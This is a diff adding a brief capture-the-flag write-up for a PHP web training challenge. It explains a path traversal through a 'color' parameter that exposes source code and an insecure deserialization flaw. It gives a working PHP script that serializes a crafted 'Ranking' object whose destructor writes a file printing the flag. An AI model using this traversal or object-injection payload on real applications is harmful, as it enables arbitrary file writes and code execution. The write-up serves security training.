@@ -1,0 +1,24 @@
+this challenged was mostly explained in the year 22/23
+
+Basically there are two main vulnerabilities in this code:
+1) there is a blue button on index that loads a css file by a get request.
+    If you use color='../filename' you get the source code in the style 
+    of the rendered page. 
+2) After having downloaded everything I saw in innerGame.php the ranking class
+    having the __destruct function who is writing a file in the memory
+
+So I crafted this code in php
+
+<?php
+class Ranking{
+  public $ranking ="<?php echo getenv('FLAG'); ?>";
+  public $changed = true;
+  public $path = "./hello2.php";
+}
+
+$r = new Ranking(); 
+echo serialize($r)
+?>
+
+the result is stored in replay file. Once loaded in the memory I can call 
+http://1024.training.jinblack.it/games/hello2.php and the flag will be printed
